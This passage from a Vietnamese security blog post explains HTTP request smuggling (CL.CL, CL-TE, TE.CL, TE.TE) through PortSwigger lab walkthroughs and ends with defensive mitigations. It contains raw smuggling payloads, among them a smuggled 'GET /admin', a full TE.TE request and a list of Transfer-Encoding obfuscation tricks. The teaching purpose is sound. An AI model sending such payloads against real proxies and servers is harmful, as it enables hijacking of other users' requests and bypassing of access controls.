<p> Lúc này độ dài của dữ liệu mà Proxy Server nhận được là 8 bytes , kiểm tra nội dung “12345\r\na” đã đủ và nó chuyển tiếp request như vậy đến BE server.Khi đến Back-end Server sẽ lấy giá trị của CL header cuối  là 7 bytes . Sau khi đọc 7 ký tự đầu tiên “12345\r\n” (Để lại “a” trong cache huhu), Back-end Server xác định rằng request đã được đọc và kết thúc request (Server sẽ gửi response tương ứng cho request này ).Như vậy cache vẫn còn có giữ chữ “a” thừa từ request trước.Lúc này Back-end Server cho rằng “a”là một phần của request tiếp theo.Nếu như thời điểm này có mình hoặc một người dùng thường khác gửi request đến Server như sau:</p>
<p>GET /index.html HTTP/1.1\r\n<br>Host: example.com\r\n</p>
<p>Như chúng ta đã biết từ trước, các kết nối TCP thường được sử dụng lại giữa máy chủ proxy và máy chủ nguồn. Nên request này sẽ được ghép vào sau  “a” giống như ổ cắm - Jame Kettle nói . Khi đó Back-end Server nhận được request như này :</p>
<p>aGET /index.html HTTP/1.1\r\n<br>Host: example.com\r\n</p>
<p>Làm gì có method aGET đúng không các bạn ? Server sẽ xử lí và trả về một lỗi tương tự như “aGET request method not found”.Như vậy là bạn đã có thể thực hiện một cuộc tấn HRS hay làm ảnh hưởng yêu cầu của người dùng khác và thậm trí mở rộng thành một cuộc tấn công khác như CSRF.</p>
<h3>CL-TE</h3>



<p> CL-TE có nghĩa là khi nhận được request có hai header này,  proxy server chỉ xử lý header Content-Length còn Back-End Server phía sau sẽ tuân thủ các quy định về <a rel="noreferrer noopener" href="https://tools.ietf.org/html/rfc2616" target="_blank">RFC2616</a>, bỏ qua Content -Length, xử lý header Transfer-Encoding.</p>
<p>Transfer-Encoding có thể chỉ định nhiều kiểu mã hóa nhưng chúng ta chỉ cần quan tâm đến chunked -mã hóa kiểu khối .Định dạng dữ liệu chuyển kiểu khối như sau:</p>
<p>[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = 0][\r\n][\r\n]</p>
<p> trong đó giá trị của “size” được biểu thị bằng hệ thập lục phân. Khi chunk size bằng không có nghĩa là kết thúc nội dung của body.</p>
<img src="/images/HRS/chunk_transfer.png" class="[class names]" title="[500] [500] " alt="Cách đọc body request của TE">



<p>Mình sẽ sử dụng lab của PortSwigger để làm lấy ví dụ luôn cho sinh động  ( thực tế sẽ khó hơn nhé) cùng với đó mình sẽ sử dụng BurpSuite và extention <a rel="noreferrer noopener" href="https://github.com/PortSwigger/http-request-smuggler" target="_blank">Http request Smuggler</a> của nó (Các bạn tự tìm hiểu nha), ngoài ra có 1 công cụ nữa là <a target="_blank" rel="noopener" href="https://github.com/defparam/smuggler">smuggler</a> rất hữu hiệu cho các bạn săn bug :</p>
<p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noreferrer noopener">Link lab Portswigger</a></p>
<p>Đây là request mình sẽ check đầu tiên , cung như là cấu trúc của một request CL.TE:</p>
<img src="/images/HRS/image-3.png" class="[class names]" title="[500] [500] " alt="title text">




<p>Vì Front-End Server xử lí  Content-Length, sau khi kiểm tra độ dài của payload body đúng là 36, FE coi đây là một request hoàn chỉnh và forward nó đi. </p>
<p>Chắc chắn sẽ có bạn thắc mắc về độ cài của body của request khi nhận được.Bạn nhìn  và đếm rõ rảng không đủ 36 bytes như content length hiện. Đây là do trong body còn dùng 2 kí tự ngắt dòng là CR (\r)  và LF  (\n), trong các ví dụ hình ảnh mình đưa ra sẽ lược bỏ nó đi cho đỡ rối mắt. :</p>
<!-- wp:preformatted -->
<pre class="wp-block-preformatted">0 \ r \ n
\ r \ n
GET /admin HTTP/1.1</pre>
<!-- /wp:preformatted -->


<p>Tiếp tục,khi gói tin được chuyển đến thì back-end sẽ xử lýTransfer-Encoding header.Nhưng đập vào mắt nó là  “0 \ r \ n”, nên Back-end cho rằng đã kết thúc request,để lại đoạn “GET /admin HTTP/1.1” trong cache, chờ đợi request tiếp theo đến. Kết quả trong lab mình thực hiện sẽ như thế này:</p>
<img src="/images/HRS/image-2.png" class="[class names]" title="[500] [500] " alt="title text">


<p>Ok như vậy là đã có dấu hiệu để thực hiện tấn công HRS.</p>
<h3>TE.CL</h3>



<p>Khi bạn hiểu được CL.TE rồi thì đối với kiểu này nó cũng tương tự chỉ là đảo vế cho nhau thôi ( FE sẽ xử lí TE còn BE xử lí CL).PortSwigger cũng có lab  tương tự :</p>
<p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noreferrer noopener">Link lab Portswigger</a></p>
<img src="/images/HRS/image-4.png" class="[class names]" title="[500] [500] " alt="title text">




<p>Request đến FE và xử lí TE, khi nó đọc dến “0 \ r \ n \ r \ n”, nó coi là dã đọc xong, request hoàn chỉnh và  chuyển tiếp đến máyBE  server. BE server xử lý CL,khi nó đọc đến “12 \ r \ n:, nó coi như là request đã kết thúc. Còn phần còn lại thì nó cho là của một yêu cầu khác</p>
<!-- wp:preformatted -->
<pre class="wp-block-preformatted">GPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n</pre>



<p>Và reponse trả về với lỗi dễ hiểu</p>
<img src="/images/HRS/image-5.png" class="[class names]" title="[500] [500] " alt="title text">




<p>Ok!</p>
<h3>TE.TE</h3>



<p>Đây kiểu cuối cùng, nó cũng tự như CL.CL là sử dụng 2 header TE trong reuqest nhưng mà nó vẫn chưa rõ quy chế như CL.CL (lỗi 400) trong tài liệu của RFC. Ở đây chúng ta cần tìm cách đưa TE.TE về 2 kiểu TE vs CL. Trick được đưa ra trong Portswigger là che dấu header TE, có dùng trong request nhưng không được xử lí.</p>
<p><a rel="noreferrer noopener" href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank">Link Lab PortSwigger</a></p>
<p>Trong trương hợp này cả 2 server đều muôn xử lí TE. Như các bạn đã biết TE sẽ có 5 giá trị mặc định (gzip, chunked, identity…), mình sẽ giấu một header bằng cách cho nó giá trị không tồn tại là “cow” và thêm cả CL vào request.</p>
<!-- wp:preformatted -->
<pre class="wp-block-preformatted">POST / HTTP/1.1\r\n
Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Language: en-US,en;q=0.5\r\n
Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n</pre>
<!-- /wp:preformatted -->


<p>FE sẽ xử lí TE đầu tiên, nó kiểm tra đến khi đọc đến “0\r\n\r\n” . Request hoàn chỉnh và forward đến BE. BE xét header TE cuối nhưng có vấn đề và nó chuyển sang xử lí bằng CL. Như vậy trong trường hợp FE cử lí TE đầu tiền còn BE xử lí TE cuối thì ta đã đưa về kiểu TE.CL, còn nếu như FE xử lí TE cuối  còn BE xứ lí TE đầu thì ngược lại.</p>
<p>Ngoài cách này ra còn nhiều cách để thực hiện xáo trộn tiêu đề TE này như:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
<p>HAproxy CVE-2019-18277 đã xử dụng cách này để khai thác bạn có thể tham khảo thêm. Dưới đây là 1 bài <a target="_blank" rel="noopener" href="https://github.com/o-o-overflow/dc2020q-uploooadit">CTF</a> yêu cầu chụp lại request của người khác dựa vào CVE này và mình đã khai thác thành công. </p>
<div class="video-container"><iframe src="https://www.youtube.com/embed/SQIbpqVfd14" frameborder="0" loading="lazy" allowfullscreen></iframe></div>



<p>OK như vậy là mình đã trình bày xong về các kiểu tấn công HRS, bạn không hiểu phần nào hãy để lại comment cho mình.</p>
<h3 id="6-how-to-prevent-http-request-smuggling">Cách ngăn chặn buôn lậu yêu cầu HTTP</h3>



<p>Chúng ta đã biết tác hại của lỗ hổng HTTP request Smuggling và chúng ta sẽ đặt câu hỏi: làm thế nào để ngăn chặn nó?Có ba cách phòng thủ chung (không dành riêng cho một máy chủ cụ thể nào cả nha).</p>
<ul><li>Vô hiệu hóa "reuse" sử dụng kết nối TCP - <a rel="noreferrer noopener" href="https://docs.apigee.com/api-platform/antipatterns/disable-persistent-connections" target="_blank">disable kết nối liên tục</a> (keep -alive) giữa proxy server và back-end server</li><li>Sử dụng giao thức HTTP/2. HTTP/2 có cách ngăn chặn HRS bằng các tính năng mới như "Request multiplexing over a single TCP connection, Compression of request headers"</li><li>Máy chủ front và back end  sử dụng cùng một máy chủ hoặc tất cả các máy chủ chạy cùng một phần mềm máy chủ web có cùng cấu hình ( Tránh các phiên bản cho phép lỗ hổng này diễn ra như <a rel="noreferrer noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-8004" target="_blank">Apache Traffic Server</a> (ATS) versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3 - <a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/" target="_blank" rel="noreferrer noopener">POC</a>).</li></ul>


<p>Tất nhiên các biện pháp trên chỉ có thể giải quyết vấn đề một cách cơ bản và còn nhiều khiếm khuyết như vô hiệu hóa việc sử dụng lại kết nối TCP giữa máy chủ proxy và máy chủ back-end, điều này sẽ làm tăng áp lực lên  back-end server.Sử dụng HTTP/2 thì không thể được quảng bá trong các điều kiện mạng hiện tại, ngay cả khi máy chủ hỗ trợ giao thức HTTP / 2 tương thích với HTTP / 1.1.Và xét về bản chất, lý do dẫn đến HTTP request Smuggling  không phải là vấn đề thiết kế giao thức mà là vấn đề của việc triển khai máy chủ khác nhau.Cá nhân mình nghĩ rằng giải pháp tốt nhất là thực hiện nghiêm túc theo các tiêu chuẩn quy định trong RFC7230-7235, nhưng đây là điều khó khăn nhất để đạt được bởi vì bản chất RFC chỉ là các bản nghiên cứu, tiêu chí phát triển được khuyến nghị chứ không phải là các chuẩn bắt buộc do đó vẫn xảy ra tình trạng bất đồng bộ giữa các máy chủ .</p>
<p>Cảm ơn các bạn đã đọc , mình rất thích lỗ hổng này nên chắc chắn sẽ có bài viết thêm về nó , mong các bạn đón đọc nha!</p>
<h2>Tài liệu tham khảo</h2>



<ul><li><a target="_blank" rel="noopener" href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li><li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a></li><li><a target="_blank" rel="noopener" href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li><li><a target="_blank" rel="noopener" href="https://www.pentestpartners.com/security-blog/http-request-smuggling-a-how-to/">https://www.pentestpartners.com/security-blog/http-request-smuggling-a-how-to/</a></li></ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.hydrasky.ml/2020/06/14/HTTP%20Request%20Smuggling%20Attack/" data-id="ckhqle8u50017o7jmfp3vdj74" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentest-Web/" rel="tag">Pentest Web</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/BugBoutyTip/" rel="tag">BugBoutyTip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lab/" rel="tag">Lab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest-Web/" rel="tag">Pentest Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/BugBoutyTip/" style="font-size: 13.33px;">BugBoutyTip</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Lab/" style="font-size: 10px;">Lab</a> <a href="/tags/Pentest-Web/" style="font-size: 16.67px;">Pentest Web</a> <a href="/tags/Technology/" style="font-size: 20px;">Technology</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/29/OS%20command%20Injection/">Command Injection TIP</a>
          </li>
        
          <li>
            <a href="/2020/11/28/DVWA-Part1/">DVWA (OWASP)</a>
          </li>
        
          <li>
            <a href="/2020/07/23/CORS/">Cross-Origin Resource Sharing</a>
          </li>
        
          <li>
            <a href="/2020/06/15/CROSS%20SIDE%20REQUEST%20FORGERY/">Cross Side Request Forgery</a>
          </li>
        
          <li>
            <a href="/2020/06/14/Oauth/">OAUTH</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 Le Binh An<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>